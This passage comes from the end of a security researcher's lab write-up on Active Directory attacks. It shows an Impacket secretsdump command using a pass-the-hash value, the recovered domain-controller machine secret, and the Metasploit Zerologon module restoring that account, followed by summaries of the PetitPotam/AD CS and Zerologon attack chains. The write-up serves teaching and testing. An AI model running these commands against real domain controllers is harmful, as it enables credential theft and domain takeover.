+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> /usr/share/doc/python3-impacket/examples/secretsdump.py</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  administrator@192.168.201.9</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -hashes</span><span style="color:#9ECBFF"> aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -outputfile</span><span style="color:#9ECBFF"> victim.com</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -user-status</span></span></code></pre>
+<p>The important entry is:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>VICTIM\ADVICTIM2012R2$:plain_password_hex:cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38</span></span></code></pre>
+<p>That hex value is what I use to restore the DC machine account.</p>
+<h2 id="restore-the-machine-account">Restore the machine account</h2>
+<p>Back in Metasploit:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) &gt; set action RESTORE</span></span>
+<span class="line"><span>action =&gt; RESTORE</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) &gt; set PASSWORD cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) &gt; exploit</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[+] 192.168.201.9:49155 - Successfully set machine account (advictim2012r2$) password</span></span>
+<span class="line"><span>[*] Auxiliary module execution completed</span></span></code></pre>
+<p>Job done: exploit validated, secrets demonstrated in the isolated lab, and the machine account is back where it belongs.</p>
+<h2 id="what-this-lab-taught-me">What this lab taught me</h2>
+<p>These two attacks look very different, but I use the same habit for both: write down what I gain after each step.</p>
+<p>For PetitPotam / AD CS:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>coerced auth</span></span>
+<span class="line"><span>  → relayed machine identity</span></span>
+<span class="line"><span>  → certificate</span></span>
+<span class="line"><span>  → Kerberos ticket</span></span>
+<span class="line"><span>  → machine hash</span></span>
+<span class="line"><span>  → privileged ticket</span></span>
+<span class="line"><span>  → directory secrets</span></span></code></pre>
+<p>For Zerologon:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>Netlogon bypass</span></span>
+<span class="line"><span>  → DC machine identity</span></span>
+<span class="line"><span>  → temporary password change</span></span>
+<span class="line"><span>  → directory secrets</span></span>
+<span class="line"><span>  → recover machine secret</span></span>
+<span class="line"><span>  → restore</span></span></code></pre>
+<p>That makes long attack chains much easier to debug. When something fails, I know exactly which step I am missing.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429">Microsoft KB5005413 — Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)</a></li>
+<li><a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">Authenticating with certificates when PKINIT is not supported</a></li>
+</ul>
+</article><aside class="research-sidebar kb-sidebar"><div class="meta-panel"><h2>Reference metadata</h2><dl><div><dt>Category</dt><dd>Infrastructure</dd></div><div><dt>Topics</dt><dd>Active Directory, AD CS, NTLM Relay, Kerberos, PetitPotam, Zerologon</dd></div></dl></div><div class="meta-panel archive-note"><h2>Knowledge Base scope</h2><p>Reusable technical notes and methodology. Vulnerability-specific evidence remains in Research.</p></div></aside></div></section></main><footer class="site-footer"><div class="container footer-inner"><div><strong>h00die-gr3y</strong><p>Independent security research and exploit development.</p></div><div class="footer-meta"><a href="/rss.xml">RSS</a><a href="/advisories/">Advisories</a><a href="/disclaimer/">Disclaimer</a><a href="https://github.com/h00die-gr3y" target="_blank" rel="noopener noreferrer">GitHub ↗<span class="sr-only"> (opens in a new tab)</span></a></div></div></footer></body></html>
